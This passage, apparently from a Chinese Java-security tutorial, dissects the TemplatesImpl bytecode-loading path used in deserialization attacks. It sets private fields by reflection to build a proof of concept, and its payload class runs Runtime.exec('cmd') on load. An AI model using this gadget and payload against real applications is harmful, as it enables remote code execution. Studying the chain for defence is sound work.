data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">getFeature</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">XMLConstants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FEATURE_SECURE_PROCESSING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            transformer<span class=\"token punctuation\">.</span><span class=\"token function\">setSecureProcessing</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> transformer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>代码逻辑</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> templates <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        templates<span class=\"token punctuation\">.</span><span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面是代码逻辑，但是还有很多参数我们没有初始化</p>\n<h3 id=\"templatesimpl-参数初始化\"><a class=\"anchor\" href=\"#templatesimpl-参数初始化\">#</a> TemplatesImpl 参数初始化</h3>\n<p>构造函数就一个无参构造，不需要特别关注</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 构造函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>从 newTransformer 走到 getTransletInstance 一路平安</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">Transformer</span> <span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">TransformerImpl</span> transformer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        transformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerImpl</span><span class=\"token punctuation\">(</span><span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _outputProperties<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            _indentNumber<span class=\"token punctuation\">,</span> _tfactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>getTransletInstance 到 defineTransletClasses 需要两个 if 条件，第一个_name 不能为空，第二个_class 必须为空，不需要复制</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">Translet</span> <span class=\"token function\">getTransletInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_name <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_class <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>defineTransletClasses 到 defineClass，_bytecodes 不能为空，_tfactory 不能为空，<em><strong>注意_bytecodes，它是我们要执行的字节码</strong></em></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">defineTransletClasses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransformerConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_bytecodes <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token class-name\">ErrorMsg</span> err <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ErrorMsg</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ErrorMsg</span><span class=\"token punctuation\">.</span><span class=\"token constant\">NO_TRANSLET_CLASS_ERR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerConfigurationException</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">TransletClassLoader</span> loader <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TransletClassLoader</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token class-name\">AccessController</span><span class=\"token punctuation\">.</span><span class=\"token function\">doPrivileged</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PrivilegedAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransletClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">findClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>_tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">getExternalExtensionsMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> classCount <span class=\"token operator\">=</span> _bytecodes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            _class <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span>classCount<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>classCount <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                _auxClasses <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> classCount<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> loader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>_bytecodes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span> superClass <span class=\"token operator\">=</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token comment\">// Check if this is the main class</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>superClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ABSTRACT_TRANSLET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    _transletIndex <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                    _auxClasses<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>_class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>了解完执行条件后，开始构造 PoC</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 Class</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token comment\">// 对_name 进行复制</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Field</span> name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// 对_bytecodes 进行赋值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/zhy/Desktop/Classes/Test.class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Field</span> bytecodes <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">// 对 _tfactory 进行赋值</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Field</span> tfactory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        templates<span class=\"token punctuation\">.</span><span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>PoC 构造完成，逻辑上来说是可以进行利用了，但是我们在运行是会报出一个空指针错误，我们跟着调试进去，走到 TemplatesImpl ().defineTransletClasses 的 if 的 _auxClasses 里跳除了空指针。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> classCount<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> loader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>_bytecodes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span> superClass <span class=\"token operator\">=</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSuperclass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>superClass<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ABSTRACT_TRANSLET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            _transletIndex <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        _auxClasses<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>_class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _class<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_transletIndex <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token class-name\">ErrorMsg</span> err<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ErrorMsg</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ErrorMsg</span><span class=\"token punctuation\">.</span><span class=\"token constant\">NO_MAIN_TRANSLET_ERR</span><span class=\"token punctuation\">,</span> _name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerConfigurationException</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们查看代码它会去判断执行类的 superClass 的 getName 是否是 ABSTRACT_TRANSLET，如果不是就会跳到 else, 但是_auxClasses 我们没有赋值，所以会报出空指针错误，现在有两种方法，第一种，对_auxClasses 进行赋值，但是我们看到_auxClasses 是 transient 的，在反序列化时是不会传输的，所以我们只能选择第二种，就是让执行类的继承一个满足的父类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">ABSTRACT_TRANSLET</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token operator\">=</span> <span class=\"token string\">\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>实例</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DOM</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransletException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>runtime<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractTranslet</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>dtm<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DTMAxisIterator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>serializer<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SerializationHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractTranslet</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> handlers<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DTMAxisIterator</span> iterator<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span> handler<span 